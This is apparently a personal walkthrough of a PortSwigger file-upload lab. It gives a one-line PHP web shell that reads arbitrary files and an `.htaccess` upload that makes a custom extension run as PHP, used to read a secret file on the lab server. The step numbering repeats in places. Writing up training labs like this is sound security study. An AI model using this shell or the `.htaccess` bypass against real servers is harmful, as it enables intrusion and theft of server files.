https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

This lab contains a vulnerable image upload function.
upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret


1) write a exploit.php file that contains 
    <?php echo file_get_contents($_GET['filepath']); ?>

2) upload it as image,
    the website blocks it using a blacklist but in the response headers we can read
    
    Apache/2.4.41 (Ubuntu)

3) generally apache web servers use .htaccess to obtain the directory-specific configuration, so try to map an extension (.l33t) to application/x-httpd-php 
    with this we are able to force the server to interpret l33t file as php files

    change the request POST to /my-account/avatar changing filename to
    
    filename=".htaccess"

    change the body content (php code) into 
    
    AddType application/x-httpd-php .l33t

    Send it

4) change the php file extension to exploit.l33t

5) upload it 

3) open the image in another tab and add the query parameter to have 
    /files/avatars/exploit.l33t?filepath=/home/carlos/secret

4) done

NOTE: Web servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved.
